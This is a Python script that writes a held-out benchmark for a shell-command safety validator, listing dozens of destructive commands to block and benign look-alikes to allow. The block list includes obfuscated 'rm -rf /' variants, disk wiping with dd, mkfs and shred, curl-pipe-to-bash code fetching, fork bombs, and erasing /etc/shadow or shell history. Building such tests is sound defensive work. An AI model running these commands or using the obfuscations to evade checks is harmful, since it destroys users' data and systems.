"""Build eval/adversarial_v2.jsonl: a harder, held-out validator benchmark.

Why this exists: in v1 every transform obfuscated only the PROGRAM NAME and left
the dangerous arguments (e.g. "-rf /") in plain view. v2 obfuscates the ARGUMENTS
and TARGETS too, and adds more benign look-alikes.

Test data only: every entry is a string to be CLASSIFIED by the validator.
Nothing in this file or in the output is ever executed.

Row format (same as v1): id, command, technique, should_block.
"""
import json
import pathlib

# (technique, command). All are destructive if executed, so should_block = True.
ATTACKS = [
    # --- rm: alternative flag spellings and ordering
    ("rm_long_options", "rm --recursive --force /"),
    ("rm_split_flags", "rm -r -f /"),
    ("rm_flags_reordered", "rm -fr /"),
    ("rm_capital_r", "rm -Rf /"),
    ("rm_flags_after_target", "rm / -rf"),
    ("rm_no_preserve_root", "rm -rf --no-preserve-root /"),
    # --- rm: alternative spellings of the target
    ("rm_target_dot", "rm -rf /."),
    ("rm_target_double_slash", "rm -rf //"),
    ("rm_target_parent_walk", "rm -rf /tmp/.."),
    ("rm_target_glob", "rm -rf /*"),
    ("rm_target_home_var", "rm -rf $HOME"),
    ("rm_target_home_braced", "rm -rf ${HOME}"),
    ("rm_target_home_quoted", 'rm -rf "$HOME"'),
    ("rm_target_tilde_glob", "rm -rf ~/*"),
    ("rm_target_system_dir", "rm -rf /etc"),
    ("rm_target_system_dir", "rm -rf /usr"),
    ("rm_target_system_dir", "rm -rf /var/lib"),
    ("rm_target_substitution", "rm -rf $(echo /)"),
    ("rm_target_pwd_parent", "rm -rf $(pwd)/.."),
    # --- target held in a variable
    ("target_in_variable", "T=/; rm -rf $T"),
    ("target_in_variable", "T=/; rm -rf \"$T\""),
    ("target_in_variable", "d=/dev/sda; dd if=/dev/zero of=$d"),
    ("target_in_variable", "d=/dev/sda; mkfs.ext4 $d"),
    # --- program AND arguments both obfuscated
    ("combined_obfuscation", 'r""m -rf $HOME'),
    ("combined_obfuscation", "r''m -r -f /"),
    ("combined_obfuscation", "\\rm --recursive --force /"),
    ("combined_obfuscation", 'bash -c "rm -rf $HOME"'),
    ("combined_obfuscation", "eval 'rm -rf ${HOME}'"),
    # --- disk and filesystem destruction, alternative device names
    ("disk_alt_device", "dd if=/dev/zero of=/dev/nvme0n1"),
    ("disk_alt_device", "dd if=/dev/urandom of=/dev/sdb bs=1M"),
    ("disk_alt_device", "dd of=/dev/sda if=/dev/zero"),
    ("disk_alt_device", "mkfs -t ext4 /dev/sda1"),
    ("disk_alt_device", "mkfs.xfs -f /dev/sdb"),
    ("disk_alt_device", "wipefs -a /dev/sda"),
    ("disk_alt_device", "shred -vfz -n 3 /dev/sda"),
    ("disk_alt_device", "cat /dev/urandom > /dev/sda"),
    ("disk_alt_device", "echo x | tee /dev/sda"),
    # --- permissions on system paths
    ("perm_system_path", "chmod -R 000 /etc"),
    ("perm_system_path", "chmod -R 777 /usr"),
    ("perm_system_path", "chown -R nobody /"),
    ("perm_system_path", "chown -R nobody:nobody /etc"),
    # --- find / xargs with separated program and arguments
    ("find_destructive", "find / -type f -delete"),
    ("find_destructive", "find ~ -delete"),
    ("find_destructive", "find / -name '*' -exec rm -f {} \\;"),
    ("xargs_separated", "ls / | xargs rm -rf"),
    ("xargs_separated", "echo /dev/sda | xargs shred"),
    ("xargs_separated", "printf '%s\\n' / | xargs -I{} rm -rf {}"),
    # --- remote code and interpreters
    ("remote_code", "curl -fsSL http://example.com/i.sh | bash"),
    ("remote_code", "wget -O- http://example.com/i.sh | sudo sh"),
    ("remote_code", "bash <(curl -s http://example.com/i.sh)"),
    ("interpreter_delete", "python3 -c 'import os; os.system(\"rm -rf /\")'"),
    ("interpreter_delete", "perl -e 'system(\"rm -rf $ENV{HOME}\")'"),
    ("interpreter_delete", "ruby -e 'system(\"rm -rf /\")'"),
    # --- critical files and history
    ("critical_file", "echo > /etc/passwd"),
    ("critical_file", "truncate -s 0 /etc/shadow"),
    ("critical_file", "mv /etc/passwd /tmp/p"),
    ("critical_file", "cat /dev/null > /boot/vmlinuz"),
    ("history_wipe", "history -c; rm -f ~/.bash_history"),
    ("history_wipe", "shred -u ~/.bash_history"),
    # --- fork bomb and process killing
    ("fork_bomb", ":(){ :|:& };:"),
    ("fork_bomb", "bomb() { bomb | bomb & }; bomb"),
    ("process_kill", "kill -9 -1"),
    ("process_kill", "killall -9 sshd"),
    ("process_kill", "pkill -9 -u root"),
    # --- power control
    ("power", "reboot"),
    ("power", "poweroff -f"),
    ("power", "systemctl poweroff"),
    ("power", "init 0"),
]

# Benign look-alikes. All must stay unflagged or, at worst, be WARN rather than BLOCK.
BENIGN = [
    "rm -rf ./build", "rm -rf node_modules", "rm -rf /tmp/mydir", "rm -f *.log",
    "rm -r build/", "rm -rf \"$HOME/.cache/pip\"",
    "dd if=/dev/zero of=./test.img bs=1M count=10", "dd if=input.iso of=output.iso",
    "mkfs.ext4 ./disk.img", "truncate -s 10M sparse.img",
    "chmod -R 755 ./site", "chmod 600 ~/.ssh/id_rsa", "chown -R $USER ./project",
    "find . -name '*.o' -delete", "find /var/log -name '*.gz' -type f",
    "find . -type f -name '*.bak'", "ls | xargs wc -l", "echo a b | xargs echo",
    "kill -9 4321", "kill -TERM 999", "pkill -f myscript", "systemctl status ssh",
    "history | tail -n 5", "cat ~/.bash_history | grep ssh",
    "cat /etc/os-release", "ls -l /etc/passwd", "stat /etc/shadow",
    "ls /boot", "df -h /dev/sda1", "lsblk", "fdisk -l",
    "curl -fsSL http://example.com/i.sh -o i.sh", "wget http://example.com/file.tar.gz",
    "python3 -c 'print(1 + 1)'", "perl -e 'print \"hi\\n\"'",
    "echo \"reboot\"", "echo 'rm -rf /' | cat", "grep -rn \"mkfs\" docs/",
    "man shutdown", "cp /etc/hostname ./hostname.bak", "tar -tzf backup.tar.gz",
]


def main():
    rows = []

    def add(command, technique, should_block):
        rows.append({
            "id": f"v2-{len(rows) + 1:04d}",
            "command": command,
            "technique": technique,
            "should_block": should_block,
        })

    for technique, cmd in ATTACKS:
        add(cmd, technique, True)
    for cmd in BENIGN:
        add(cmd, "benign", False)

    out = pathlib.Path(__file__).resolve().parents[1] / "eval" / "adversarial_v2.jsonl"
    out.parent.mkdir(exist_ok=True)
    out.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
    print(f"wrote {len(rows)} rows to {out}")


if __name__ == "__main__":
    main()
